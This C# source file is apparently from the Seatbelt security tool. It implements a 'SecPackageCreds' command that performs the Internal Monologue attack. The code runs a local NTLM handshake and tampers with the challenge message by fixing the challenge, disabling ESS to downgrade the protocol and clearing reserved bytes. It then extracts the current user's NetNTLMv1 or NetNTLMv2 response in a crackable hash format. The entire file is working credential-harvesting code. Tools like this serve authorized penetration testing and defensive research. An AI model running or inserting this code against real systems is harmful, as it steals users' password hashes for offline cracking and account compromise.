using Microsoft.Win32;
using Seatbelt.Output.Formatters;
using Seatbelt.Output.TextWriters;
using Seatbelt.Util;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace Seatbelt.Commands.Windows.SecurityPackageCredentials
{
    internal class SecPackageCredsCommand : CommandBase
    {
        public override string Command => "SecPackageCreds";
        public override string Description => "Obtains credentials from security packages";
        public override CommandGroup[] Group => new[] { CommandGroup.User };
        public override bool SupportRemote => false;
        public Runtime ThisRunTime;

        public SecPackageCredsCommand(Runtime runtime) : base(runtime)
        {
            ThisRunTime = runtime;
        }

        public override IEnumerable<CommandDTOBase?> Execute(string[] args)
        {
            var challenge = "1122334455667788";
            if (args.Length > 0)
                challenge = args[0];

            return InternalMonologueForCurrentUser(challenge, true);
        }

        struct SECURITY_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        };

        struct SECURITY_HANDLE
        {
            public IntPtr LowPart;
            public IntPtr HighPart;
        };

        private const int MAX_TOKEN_SIZE = 12288;
        private const uint SEC_E_OK = 0;
        private const uint SEC_E_NO_CREDENTIALS = 0x8009030e;
        private const uint SEC_I_CONTINUE_NEEDED = 0x90312;

        [DllImport("secur32.dll", CharSet = CharSet.Unicode)]
        static extern uint AcquireCredentialsHandle(
            IntPtr pszPrincipal,
            string pszPackage,
            int fCredentialUse,
            IntPtr PAuthenticationID,
            IntPtr pAuthData,
            int pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern uint InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            IntPtr pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            IntPtr pInput,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern uint InitializeSecurityContext(
            ref SECURITY_HANDLE phCredential,
            ref SECURITY_HANDLE phContext,
            IntPtr pszTargetName,
            int fContextReq,
            int Reserved1,
            int TargetDataRep,
            ref SecBufferDesc SecBufferDesc,
            int Reserved2,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsExpiry);

        [DllImport("secur32.dll", SetLastError = true)]
        static extern uint AcceptSecurityContext(
            ref SECURITY_HANDLE phCredential,
            IntPtr phContext,
            ref SecBufferDesc pInput,
            uint fContextReq,
            uint TargetDataRep,
            out SECURITY_HANDLE phNewContext,
            out SecBufferDesc pOutput,
            out uint pfContextAttr,
            out SECURITY_INTEGER ptsTimeStamp);

        private IEnumerable<CommandDTOBase?> InternalMonologueForCurrentUser(string challenge, bool DisableESS)
        {
            var clientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
            var serverToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            SECURITY_HANDLE hCred;
            hCred.LowPart = hCred.HighPart = IntPtr.Zero;

            SECURITY_INTEGER clientLifeTime;
            clientLifeTime.LowPart = 0;
            clientLifeTime.HighPart = 0;

            // Acquire credentials handle for current user
            var result = AcquireCredentialsHandle(
                IntPtr.Zero,
                "NTLM",
                3,
                IntPtr.Zero,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                ref hCred,
                ref clientLifeTime
            );
            if (result != SEC_E_OK)
                throw new Exception($"AcquireCredentialsHandle failed. Error: 0x{result:x8}");

            // Get a type-1 message from NTLM SSP
            result = InitializeSecurityContext(
                ref hCred,
                IntPtr.Zero,
                IntPtr.Zero,
                0x00000800,
                0,
                0x10,
                IntPtr.Zero,
                0,
                out var clientContext,
                out clientToken,
                out _,
                out clientLifeTime
            );
            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                throw new Exception($"InitializeSecurityContext failed. Error: 0x{result:x8}");

            // Get a type-2 message from NTLM SSP (Server)
            result = AcceptSecurityContext(
                ref hCred,
                IntPtr.Zero,
                ref clientToken,
                0x00000800,
                0x10,
                out _,
                out serverToken,
                out _,
                out clientLifeTime
                );
            if (result != SEC_E_OK && result != SEC_I_CONTINUE_NEEDED)
                throw new Exception($"AcceptSecurityContext failed. Error: 0x{result:x8}");

            // Tamper with the CHALLENGE message
            var serverMessage = serverToken.ToArray();
            var challengeBytes = StringToByteArray(challenge);
            if (DisableESS)
            {
                serverMessage[22] = (byte)(serverMessage[22] & 0xF7);
            }

            //Replace Challenge
            Array.Copy(challengeBytes, 0, serverMessage, 24, 8);
            //Reset reserved bytes to avoid local authentication
            Array.Copy(new byte[16], 0, serverMessage, 32, 16);

            clientToken.Dispose();
            serverToken.Dispose();
            serverToken = new SecBufferDesc(serverMessage);
            clientToken = new SecBufferDesc(MAX_TOKEN_SIZE);

            result = InitializeSecurityContext(
                ref hCred,
                ref clientContext,
                IntPtr.Zero,
                0x00000800,
                0,
                0x10,
                ref serverToken,
                0,
                out clientContext,
                out clientToken,
                out _,
                out clientLifeTime
                );

            var clientTokenBytes = clientToken.ToArray();
            clientToken.Dispose();
            serverToken.Dispose();

            if (result == SEC_E_OK)
                yield return ParseNTResponse(clientTokenBytes, challenge);
            else if (result == SEC_E_NO_CREDENTIALS)
            {
                WriteError("The security package does not contain any credentials");
                yield break;
            }
            else if (DisableESS)
            {
                var resp = InternalMonologueForCurrentUser(challenge, false);
                foreach (var r in resp)
                {
                    yield return r;
                }
            }
            else
                throw new Exception($"InitializeSecurityContext (client) failed. Error: 0x{result:x8}");
        }

        //This function parses the NetNTLM response from a type-3 message
        private NtlmHashDTO ParseNTResponse(byte[] message, string challenge)
        {
            var lm_resp_len = BitConverter.ToUInt16(message, 12);
            var lm_resp_off = BitConverter.ToUInt32(message, 16);
            var nt_resp_len = BitConverter.ToUInt16(message, 20);
            var nt_resp_off = BitConverter.ToUInt32(message, 24);
            var domain_len = BitConverter.ToUInt16(message, 28);
            var domain_off = BitConverter.ToUInt32(message, 32);
            var user_len = BitConverter.ToUInt16(message, 36);
            var user_off = BitConverter.ToUInt32(message, 40);
            var lm_resp = new byte[lm_resp_len];
            var nt_resp = new byte[nt_resp_len];
            var domain = new byte[domain_len];
            var user = new byte[user_len];
            Array.Copy(message, lm_resp_off, lm_resp, 0, lm_resp_len);
            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
            Array.Copy(message, domain_off, domain, 0, domain_len);
            Array.Copy(message, user_off, user, 0, user_len);


            if (nt_resp_len == 24)
            {
                return new NtlmHashDTO(
                    "NetNTLMv1",
                    FormatNetNtlmV1Hash(challenge, user, domain, lm_resp, nt_resp)
                    );
            }
            else if (nt_resp_len > 24)
            {
                return new NtlmHashDTO(
                    "NetNTLMv2",
                    FormatNetNtlmV2Hash(challenge, user, domain, nt_resp.SubArray(0, 16), nt_resp.SubArray(16, nt_resp.Length - 16))
                    );
            }
            else
            {
                throw new Exception($"Couldn't parse nt_resp. Len: {nt_resp_len} Message bytes: {ByteArrayToString(message)}");
            }
        }

        private string FormatNetNtlmV1Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp)
        {
            return string.Format(
                "{0}::{1}:{2}:{3}:{4}",
                Encoding.Unicode.GetString(user),
                Encoding.Unicode.GetString(domain),
                ByteArrayToString(lm_resp),
                ByteArrayToString(nt_resp),
                challenge
            );
        }

        private string FormatNetNtlmV2Hash(string challenge, byte[] user, byte[] domain, byte[] lm_resp, byte[] nt_resp)
        {
            return string.Format(
                "{0}::{1}:{2}:{3}:{4}",
                Encoding.Unicode.GetString(user),
                Encoding.Unicode.GetString(domain),
                challenge,
                ByteArrayToString(lm_resp),
                ByteArrayToString(nt_resp)
            );
        }

        //This function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        public static byte[] StringToByteArray(string hex)
        {
            var numChars = hex.Length;
            var bytes = new byte[numChars / 2];
            for (var i = 0; i < numChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
        private string ByteArrayToString(byte[] ba)
        {
            var hex = new StringBuilder(ba.Length * 2);
            foreach (var b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }
    }

    internal class NtlmHashDTO : CommandDTOBase
    {
        public NtlmHashDTO(string version, string hash)
        {
            Version = version;
            Hash = hash;
        }

        public string Version { get; }
        public string Hash { get; }
    }
}